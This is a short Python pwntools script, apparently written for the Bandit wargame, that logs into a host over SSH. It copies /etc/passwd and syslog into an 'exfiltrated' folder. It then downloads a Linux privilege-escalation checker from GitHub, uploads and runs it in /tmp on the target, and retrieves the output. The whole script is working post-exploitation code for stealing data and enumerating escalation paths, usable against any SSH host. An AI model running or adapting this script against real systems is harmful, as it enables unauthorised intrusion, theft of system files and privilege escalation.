from pwn import *
import os
import requests

username = "bandit0"
host = ""
password = "bandit0"
port = 2220

shell = ssh(username, host, password=password, port=port)
exfil_files = ['/etc/passwd', '/var/log/syslog', ]
directory = 'exfiltrated'

def download_data(shell):
    print "Exfiltrating : " + shell.distro[0] + shell.distro[1] + " with user: " + str(shell['whoami'])
    for exfil_file in exfil_files:
        print exfil_file
        to_dl = shell.download_data(exfil_file)
        if to_dl:
            if not os.path.exists(directory):
                os.makedirs(directory)
            with open(directory + "/" + exfil_file.split("/")[-1]+".txt", "w") as exfils:
                    exfils.write(to_dl)

def priv_checker(shell):
    url  = "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py"
    r = requests.get(url)
    with open("privs.py", "wb") as handle:
        for data in r:
            handle.write(data)         
    shell.upload("privs.py", "/tmp/privs.py")
    shell['chmod +x /tmp/privs.py']
    shell['python /tmp/privs.py > /tmp/privs.txt']
    privs = shell.download_data("/tmp/privs.txt")
    with open("privs.txt", "w") as exfils:
        exfils.write(privs)

if shell.connected():
    print("whoami?: " + shell['whoami'])
    download_data(shell)    
    priv_checker(shell)
